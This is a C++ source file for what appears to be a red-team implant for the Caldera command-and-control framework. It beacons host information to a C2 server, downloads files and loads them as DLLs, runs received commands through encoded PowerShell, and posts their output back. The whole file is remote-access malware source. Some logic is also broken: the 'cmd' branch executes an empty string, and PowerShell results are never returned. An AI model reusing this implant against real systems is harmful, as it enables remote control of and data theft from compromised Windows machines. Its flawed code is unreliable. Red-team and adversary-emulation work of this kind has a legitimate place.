// RedTeamAgent.cpp
// This agent opens up an HTTP session and transmits data to a C2 (Caldera). 
// We can use regular expressions to remove bad characters from the transmitted data.

#include "main.h"


string ModuleCommands = "";
HMODULE Module = NULL;
string Privilege = "User";

int main()
{
    string paw = "";
    while (true)
    {
        JSON msg = {
                "pid", "1200",
                "server", " ",          // C2 URL
                "platform", "",
                "host", "",
                "username", "",
                "architecture", "",
                "privilege", Privilege.c_str(),
                "executors", json::Array("psh", "cmd")
        };

        if (!paw.empty())
            msg["paw"] = paw;


        char* encodedmsg = b64encode((char*)msg.dump().c_str(), msg.dump().length());
        printf("Our Encoded Msg: %s\n", encodedmsg);

        HINTERNET hSession = SendRequest(" ", 80, "/beacon", "POST", encodedmsg); // C2 URL as first argument.
        if (hSession)
        {
            printf("Data has been sent successfully\n");
        }
        else
        {
            printf("Error in sending data\n");
        }



        DWORD Length = 0;
        char* Response = GetResponse(hSession, &Length);
        printf("Caldera Response: %s\n", Response);
        if (Response == NULL || Length == 0)
            continue;

        InternetCloseHandle(hSession);
        char* DecodedResponse = b64decode(Response, Length);
        string response = DecodedResponse;
        response = regex_replace(response, regex("\\\\"), "");
        response = regex_replace(response, regex("\"\\["), "[");
        response = regex_replace(response, regex("\"\\{"), "{");
        response = regex_replace(response, regex("\\]\""), "]");
        response = regex_replace(response, regex("\\}\""), "}");
        printf("Caldera Decoded Response: %s\n", response.c_str());

        JSON res = JSON::Load(response);
        paw = res["paw"].ToString();
        int sleep = res["sleep"].ToInt();
        cout << "paw: " << paw << "\n";
        cout << "sleep: " << sleep << "\n";

        for (int i = 0; i < res["instructions"].length(); i++)
        {
            string id = res["instructions"][i]["id"].ToString();
            string command = res["instructions"][i]["command"].ToString();
            string executor = res["instructions"][i]["executor"].ToString();
            cout << "id: " << id << "\n";
            cout << "command: " << command << "\n";
            cout << "executor: " << executor << "\n";
            char* decodecmd = b64decode((char*)command.c_str(), command.length());
            cout << "Decoded command: " << decodecmd << "\n";


            //Execute Instructions
            string cmd = "";
            char* output = NULL;
            size_t length = 0;
            if (executor == "psh")
            {
                string fullcmd = decodecmd;
                if (fullcmd.rfind("download ", 0) == 0)
                {
                    DWORD Length = 0;
                    //download <filename>
                    string filename = fullcmd.substr(strlen("download "));
                    string FullURL = "" + filename; // C2 URL
                    char* FileData = DownloadFile(FullURL.c_str(), &Length, NULL);
                    FILE* f = fopen(filename.c_str(), "wb");
                    fwrite(FileData, 1, Length, f);
                    fclose(f);

                    Module = LoadLibrary(filename.c_str());
                    FARPROC Install = GetProcAddress(Module, "Install");
                    ModuleCommands = (char*)Install();
                    cout << ModuleCommands << "\n";
                    system("pause");
                }
                else if (fullcmd.find(ModuleCommands, 0) != -1)
                {

                    FARPROC ModuleFunc = GetProcAddress(Module, fullcmd.c_str());
                    if (ModuleFunc != NULL)
                    {

                        output = (char*)ModuleFunc();
                        cout << "Command Output: " << output << "\n";
                        system("pause");
                    }
                    else
                    {
                        cout << "Error finding function: " << fullcmd.c_str() << "\n";
                        system("pause");
                    }

                }
                else
                {

                    wstring unicodecmd = ConvertAnsiToWide(decodecmd);
                    char* b64cmd = b64encode((char*)unicodecmd.c_str(), unicodecmd.length() * 2);
                    cmd = "powershell.exe -nop -enc " + string(b64cmd);
                    cout << "Our Command = " << cmd << "\n";

                    output = ExecuteApplication(cmd, length);
                }


            }
            else if (executor == "cmd")

            {

                cout << "Our command = " << cmd << "\n";
                size_t length = 0;
                output = ExecuteApplication(cmd, length);

                if (output == NULL || length == 0)
                {
                    output = (char*)"None";
                    length = strlen(output);
                }
                else
                    cout << "Output = " << output << "\n";

                JSON results = {
                    "id", id,
                    "output", b64encode(output,length),
                    "status", 0,
                    "pid", 0
                };

                JSON msg = {
                    "paw", paw,
                    "results", json::Array((results))
                };
                cout << msg.dump() << "\n";

                char* encodedmsg = b64encode((char*)msg.dump().c_str(), msg.dump().length());
                printf("Our Encoded Msg: %s\n", encodedmsg);

                hSession = SendRequest(" ", 80, "/beacon", "POST", encodedmsg);  // C2 URL
                if (hSession)
                {
                    printf("Data has been sent successfully\n");
                }
                else
                {
                    printf("Error in sending data\n");
                }
                InternetCloseHandle(hSession);

            }

            Sleep(100 * sleep);

        }


    }

}
